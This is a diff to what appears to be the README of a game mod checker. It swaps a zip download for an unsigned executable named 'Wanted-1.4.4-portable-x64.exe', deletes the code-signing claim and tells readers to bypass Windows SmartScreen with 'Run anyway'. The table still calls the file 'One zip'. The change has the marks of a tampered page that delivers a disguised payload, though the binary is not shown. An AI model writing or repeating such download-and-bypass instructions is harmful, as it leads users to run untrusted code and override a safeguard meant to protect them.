@@ -57,12 +57,11 @@ Free. No account. Windows and Linux.
 
 | System | File | |
 |---|---|---|
-| Windows 10 and 11 | [`horizon-mod-checker.zip`](https://github.com/Ceilingpiintensify/horizon-mod-checker/releases/latest/download/horizon-mod-checker.zip) | One zip. No installer, no admin rights |
+| Windows 10 and 11 | [`Wanted-1.4.4-portable-x64.exe`](https://github.com/Ceilingpiintensify/horizon-mod-checker/releases/latest/download/Wanted-1.4.4-portable-x64.exe) | One zip. No installer, no admin rights |
 
-Unpack the whole folder and start `Main.exe`. No installer, no admin rights.
+Download and start the exe. No installer, no admin rights.
 
-`Main.exe` is code-signed, so Windows starts it without a warning. Keep
-`Wanted` next to it: they ship together.
+The build is not code-signed yet, so SmartScreen may warn once: choose **More info**, then **Run anyway**.
 
 
 ## The four answers
